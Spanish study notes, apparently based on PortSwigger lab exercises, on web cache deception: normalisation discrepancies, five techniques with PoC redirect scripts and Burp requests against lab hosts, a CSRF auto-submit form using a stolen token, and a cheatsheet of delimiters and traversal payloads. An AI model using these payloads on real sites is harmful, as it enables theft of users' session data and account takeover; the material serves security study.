
---
Tags: #headers #cabeceras #host #burpsuite #param-miner #poisoning #cache #xss #intruder #normalizacion #spacialchars


---
# Índice de Contenidos

- [[#Conceptos Básicos Engaño a la Caché Web]]
    
- [[#Entendiendo la Normalización y Caracteres Especiales]]
    
- [[#Técnica 1 Manipulación de Rutas Básica]]
    
- [[#Técnica 2 Uso de Delimitadores en la Ruta y Fuzzing]]
    
- [[#Técnica 3 Discrepancias de Normalización en el Servidor Origen]]
    
- [[#Técnica 4 Engaño a la Caché por Normalización en el Servidor de Caché]]
    
- [[#Técnica 5 Reglas de Coincidencia Exacta y Encadenamiento con CSRF]]
    
- [[#Cheatsheet Definitiva Web Cache Deception]]
    - [[#1. Delimitadores Comunes y Codificaciones (Bypasses)]]
	- [[#2. Técnicas de Normalización (Path Traversal en URL)]]
	- [[#3. Extensiones y Directorios Estáticos "Gatillo"]]
	
- [[#Referencias y Recursos Adicionales]]
	
---

## Conceptos Básicos: Engaño a la Caché Web

El **Engaño a la Caché Web (WCD)** ocurre cuando un atacante engaña a un servidor de caché para que almacene contenido dinámico y sensible de un usuario (como tokens de sesión, claves API o datos personales) haciéndole creer que es contenido estático público (como una imagen o un archivo JavaScript).

Una vez que la caché almacena la respuesta, el atacante puede acceder a la misma URL para visualizar los datos de la víctima.

**Metodología General de Explotación:**

1. **Identificar la ruta objetivo:** Buscar endpoints dinámicos que devuelvan información sensible (ej. `/my-account`).
    
2. **Forzar el almacenamiento en caché:** Añadir extensiones o caracteres para que la ruta parezca estática (ej. `.js`, `.css`).
    
3. **Validar discrepancias:** Comprobar si el servidor de origen sigue devolviendo la información del usuario, pero la caché lo marca como "HIT".
    
4. **Ejecutar el engaño:** Enviar la URL manipulada a la víctima autenticada.
    
5. **Recolectar:** Acceder a la URL cacheada para robar la información.
    

---

## Entendiendo la Normalización y Caracteres Especiales

La clave del WCD radica en las **discrepancias de análisis (Parsing Discrepancies)**. Los servidores web y los sistemas de caché aplican procesos de "normalización" a las URLs para resolver rutas relativas o decodificar caracteres antes de procesarlas. Si la caché y el servidor de origen normalizan la URL de forma diferente, surge la vulnerabilidad.

|**Concepto de Normalización**|**Descripción**|**Ejemplo Práctico**|
|---|---|---|
|**Decodificación URL**|Convertir caracteres codificados en porcentaje a su forma original.|`%2f` se convierte en `/`.|
|**Resolución de Directorios**|Resolver secuencias de retroceso o directorio actual.|`/a/b/../c` se normaliza a `/a/c`.|
|**Truncado por Delimitadores**|Uso de caracteres especiales que el servidor interpreta como fin de la ruta.|`/ruta;param` el servidor puede ignorar `;param`.|

---

## Técnica 1: Engaño a la Caché por Manipulación de Rutas Básica

Esta es la forma más directa de WCD. Depende de configuraciones de enrutamiento tolerantes en el servidor de origen, donde se ignoran las extensiones de archivo no reconocidas o añadidas al final de una ruta válida.

**Descubrimiento y Mecánica:**

Al probar un endpoint dinámico como `/my-account`, descubrimos que si solicitamos `/my-account/aaaa.js`, el servidor de origen ignora la parte `/aaaa.js` y devuelve la página de la cuenta. Sin embargo, la caché ve la extensión `.js` y aplica su regla de almacenar archivos estáticos.

**Prueba de Concepto (PoC):**

Configuramos un servidor malicioso que obligue al navegador de la víctima autenticada (Carlos) a visitar nuestra URL manipulada.

_Payload en Servidor del Atacante:_

```HTML
<script>
    document.location="https://0a36002704e188fa80740394000000af.web-security-academy.net/my-account/aaaa.js";
</script>
```

**Resultado:** La víctima visita la URL, su información sensible se carga y la caché guarda la respuesta asociada a esa URL. El atacante solo tiene que visitar esa misma URL para robar el token de Carlos.

---

## Técnica 2: Uso de Delimitadores en la Ruta y Fuzzing

Cuando la manipulación básica no funciona, buscamos caracteres que causen discrepancias de análisis. El objetivo es encontrar un delimitador que el servidor origen considere como "separador" (ignorando lo que va después), pero que la caché considere como parte del nombre del archivo.

**Uso de Herramientas (Burp Intruder + SecLists):**

Para descubrir estos delimitadores, usamos **Burp Suite Intruder**. Realizamos un ataque tipo _Sniper_, inyectando diferentes caracteres especiales entre la ruta original y nuestra extensión estática falsa.

- **Diccionario recomendado:** `/usr/share/wordlists/SecLists/Fuzzing/special-chars.txt`
    
- **Propósito:** Automatizar el envío de múltiples peticiones para ver qué carácter devuelve un `200 OK` del servidor origen y un `X-Cache: hit` (o similar) de la caché.
    

**Prueba de Concepto (PoC):**

_Petición Fuzzing en Intruder:_

```HTTP
GET /my-account{payload}a.js HTTP/2
Host: 0ae7000b037413cd82d9b08b00670009.web-security-academy.net
Cookie: session=CXDRSg2istCjIWhJqjyoyb7uvI3rfyWi
```

Tras el fuzzing, identificamos que el punto y coma (`;`) es un delimitador válido para este entorno. El servidor de origen lee `/my-account`, pero la caché almacena `/my-account;aaa.js`.

_Payload en Servidor del Atacante:_

```HTML
<script>
    document.location="https://0ae7000b037413cd82d9b08b00670009.web-security-academy.net/my-account;aaa.js";
</script>
```

---

## Técnica 3: Discrepancias de Normalización en el Servidor Origen

Esta técnica aprovecha vulnerabilidades en cómo se resuelven las rutas (Path Traversal en la URL) y las diferencias en la decodificación URL. A veces, las reglas de caché solo se aplican a directorios específicos, como `/resources/`.

**Descubrimiento y Mecánica:**

Buscamos forzar a la caché a evaluar una ruta estática permitida, mientras el servidor origen resuelve un "Directory Traversal" codificado (`..%2f`) llevándolo a la ruta dinámica.

- **La Caché:** Lee `/resources/..%2fmy-account?aaaa.js`. No decodifica `%2f` y asume que es un archivo estático bajo `/resources/`.
    
- **El Servidor Origen:** Recibe la petición, decodifica `%2f` a `/`, normaliza `/resources/../my-account` convirtiéndolo en `/my-account`, y procesa los parámetros `?aaaa.js`.
    

**Prueba de Concepto (PoC):**

_Payload en Servidor del Atacante:_

```HTML
<script>
    document.location="https://0a7b006804c509e08342057a00000071.web-security-academy.net/resources/..%2fmy-account?aaaa.js";
</script>
```

_Petición Cacheada Resultante:_

```HTTP
GET /resources/..%2fmy-account?aaaa.js HTTP/2
Host: 0a7b006804c509e08342057a00000071.web-security-academy.net
Cookie: session=55icjdHGZtrHYKQ7rvqjbuCYKnxKBUi0
```

Una vez que la víctima ejecuta el script, su respuesta de `/my-account` queda cacheada en la ruta estructurada bajo `/resources/`, lista para ser leída por el atacante.

---
## Técnica 4: Engaño a la Caché por Normalización en el Servidor de Caché

Esta técnica es la inversa de la Técnica 3. Aquí, **el servidor de caché sí decodifica y normaliza la URL**, pero el servidor de origen no lo hace (o lo hace de forma diferente).

**Descubrimiento y Mecánica:**

Aprovechamos un delimitador codificado en la URL que el servidor de origen reconoce para truncar la ruta, pero que la caché interpreta como texto plano.

1. **La Caché:** Recibe la ruta `/my-account%23%2f%2e%2e%2fresources?aa.js`. La caché no considera `%23` (`#`) como un delimitador, por lo que decodifica `%2f%2e%2e%2f` a `/../`. Al normalizar, sube un directorio y la ruta final que evalúa es `/resources?aa.js`, lo cual coincide con sus reglas para cachear contenido estático.
    
2. **El Servidor Origen:** Recibe la misma petición. Ve el `%23`, lo decodifica como `#` (fragmento) y asume que todo lo que va después es irrelevante para el enrutamiento. Por tanto, sirve la página dinámica `/my-account`.
    

**Prueba de Concepto (PoC):**

_Payload en Servidor del Atacante:_

```HTML
<script>
    document.location="https://0a0300370389cde5816b9d8400ab00d6.web-security-academy.net/my-account%23%2f%2e%2e%2fresources?aa.js";
</script>
```

_Petición Cacheada Resultante:_

```HTTP
GET /my-account%23%2f%2e%2e%2fresources?aa.js HTTP/2
Host: 0a0300370389cde5816b9d8400ab00d6.web-security-academy.net
Cookie: session=nGgDgU67YtLb4P4DTqGyJoxgkzTzJEJq
```

Al forzar a la víctima (Carlos) a visitar esta URL, la caché guarda la respuesta de `/my-account` creyendo que es un recurso estático. Nosotros solo tenemos que acceder a esa URL para extraer su clave API.

---

## Técnica 5: Reglas de Coincidencia Exacta y Encadenamiento con CSRF

A veces, las cachés no están configuradas para guardar todo un directorio (como `/resources/`), sino archivos muy específicos, como `/robots.txt` o `/favicon.ico` mediante reglas de **coincidencia exacta**.

**Descubrimiento y Mecánica:**

Aprovechamos un error de normalización donde la caché interpreta secuencias con delimitadores (ej. `;`) y _Path Traversal_ (`%2f..%2f`) como equivalentes al archivo exacto permitido.

El servidor de caché ve `/my-account;%2f%2e%2e%2frobots.txt?a.js`, lo normaliza borrando lo anterior al _Directory Traversal_ y asume que se está pidiendo `/robots.txt`. El servidor origen, al ver el punto y coma (`;`), ignora el resto y sirve `/my-account`.

**Encadenamiento Letal (WCD + CSRF):**

El engaño a la caché no solo sirve para robar datos; también permite extraer _tokens Anti-CSRF_ válidos de la sesión de la víctima para ejecutar ataques de falsificación de peticiones.

**Prueba de Concepto (PoC):**

_1. Payload para Cachear la página y robar el Token CSRF:_

```HTML
<script>
    document.location="https://0a7200310398831880d203a200d4008c.web-security-academy.net/my-account;%2f%2e%2e%2frobots.txt?a.js";
</script>
```

_Petición Cacheada Resultante (Extraemos el Token de esta respuesta):_

```HTTP
GET /my-account;%2f%2e%2e%2frobots.txt?a.js HTTP/2
Host: 0a7200310398831880d203a200d4008c.web-security-academy.net
Cookie: session=6gE2v3IgUYjRWI9nLMnJ6jEmRm2WhPRq
```

_2. Explotación CSRF con el Token robado (Cambio de Email del Admin):_

```HTML
<html>
  <body>
    <form action="https://0a7200310398831880d203a200d4008c.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="c@c.com" />
      <input type="hidden" name="csrf" value="RORfCfAbr6YxMu3IpazPt83MUoriP00R" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```

---

## Cheatsheet Definitiva: Web Cache Deception

Aquí tienes las tablas resumen con vectores, delimitadores y payloads comunes para tus auditorías. Puedes usar extensiones como _Param Miner_ en Burp Suite para automatizar algunas de estas búsquedas.

### 1. Delimitadores Comunes y Codificaciones (Bypasses)

Usa estos en tu Intruder o Fuzzer para separar la ruta dinámica de la extensión estática falsa.

|**Carácter**|**URL Encode**|**Descripción / Comportamiento esperado**|
|---|---|---|
|`;`|`%3B`|Muy común en servidores Java/Spring. Trunca parámetros de matriz.|
|`?`|`%3F`|Inicia una _Query String_. Útil si la caché ignora las querys pero guarda la extensión.|
|`#`|`%23`|Fragmento. El servidor web suele ignorar todo lo que va después.|
|`%00`|`%00`|Null Byte. Trunca cadenas en servidores antiguos (C/C++ base).|
|`%0A`|`%0A`|Salto de línea. Puede confundir a los parsers de Nginx/Apache.|
|`.`|`%2E`|Útil para manipular extensiones o confundir regex de validación.|

- **SecLists:** `/usr/share/wordlists/SecLists/Fuzzing/special-chars.txt` y diccionarios de _Path Traversal_.

### 2. Técnicas de Normalización (Path Traversal en URL)

Dependiendo de qué servidor (Caché u Origen) realice la normalización.

|**Payload de Muestra**|**Objetivo del Payload**|**Quién normaliza qué**|
|---|---|---|
|`/ruta/..%2f..%2fstatic/archivo.js`|Llegar a `/static/` para la Caché.|Origen decodifica y evalúa `/ruta/`.|
|`/estatico/..%2f..%2fruta_sensible`|Llegar a `/ruta_sensible` en el Origen.|Caché no decodifica, ve `/estatico/`.|
|`/ruta;%2f%2e%2e%2frobots.txt`|Bypass por Coincidencia Exacta.|Origen ve `;`. Caché normaliza a `/robots.txt`.|
|`/ruta%23%2f%2e%2e%2fstatic.js`|Bypass con Fragmento `#`.|Origen ve `#`. Caché normaliza a `/static.js`.|

### 3. Extensiones y Directorios Estáticos "Gatillo"

Añade estos al final de tus rutas manipuladas para activar las reglas del proxy/CDN.

|**Categoría**|**Ejemplos Comunes (Añadir a la URL manipulada)**|
|---|---|
|**Extensiones Web**|`.js`, `.css`, `.html`, `.txt`, `.json`, `.xml`|
|**Imágenes/Media**|`.png`, `.jpg`, `.jpeg`, `.gif`, `.ico`, `.svg`, `.mp4`, `.woff2`|
|**Directorios Fijos**|`/static/`, `/assets/`, `/resources/`, `/images/`, `/media/`|
|**Archivos Exactos**|`/robots.txt`, `/favicon.ico`, `/sitemap.xml`|

---

## Referencias y Recursos Adicionales

Para mantener estos apuntes actualizados, te recomiendo enlazar directamente a estos recursos en tu Obsidian:

- **PortSwigger Web Security Academy:** [Web Cache Deception - Vulnerabilidades de normalización](https://portswigger.net/web-security/web-cache-deception) (La fuente principal de los laboratorios y PoCs explicados).
    
- **PayloadsAllTheThings (GitHub):** [Web Cache Deception Cheatsheet](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Web%20Cache%20Deception) (Excelente para extraer diccionarios de fuzzing actualizados).
    
- **SecLists:** `/usr/share/wordlists/SecLists/Fuzzing/special-chars.txt` y diccionarios de _Path Traversal_.